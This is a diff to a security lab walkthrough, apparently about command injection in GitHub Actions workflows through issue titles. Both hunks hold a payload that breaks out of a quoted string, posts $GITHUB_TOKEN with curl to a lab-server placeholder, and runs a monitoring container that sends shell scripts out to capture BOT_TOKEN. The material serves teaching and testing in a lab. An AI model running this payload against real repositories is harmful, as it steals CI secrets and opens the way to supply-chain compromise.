@@ -26,7 +26,7 @@ First, you must set up a server to listen to the exfiltrated secrets in a lab en
 Then, change the `<LAB_URL>` parameter with your lab server URL, and create an issue with the following title:
 
 ```bash
-Innocent bug" && curl -d “token=$GITHUB_TOKEN” <LAB_URL> && sudo docker run --rm -v /home/runner/work/_temp:/app/monitored cycodelabs/actionmonitor -u <LAB_URL> && sleep 2 && echo "
+Innocent bug" && curl -d “token=$GITHUB_TOKEN” <LAB_URL> && sudo docker run --rm -d -v /home/runner/work/_temp:/app/monitored cycodelabs/actionmonitor -u <LAB_URL> && sleep 2 && echo "
 ```
 
 This payload consists of two commands:
@@ -36,7 +36,7 @@ This payload consists of two commands:
 curl -d “token=$GITHUB_TOKEN” <LAB_URL>
 
 # Exfiltrating BOT_TOKEN through the script that comes after
-sudo docker run --rm -v /home/runner/work/_temp:/app/monitored cycodelabs/actionmonitor -u <LAB_URL>
+sudo docker run --rm -d -v /home/runner/work/_temp:/app/monitored cycodelabs/actionmonitor -u <LAB_URL>
 ```
 
 This script uses another tool we developed - [gh-action-shell-monitor](https://github.com/CycodeLabs/gh-action-shell-monitor). This tool listens for any shell files modified in the specified directory and sends them to a designated server.
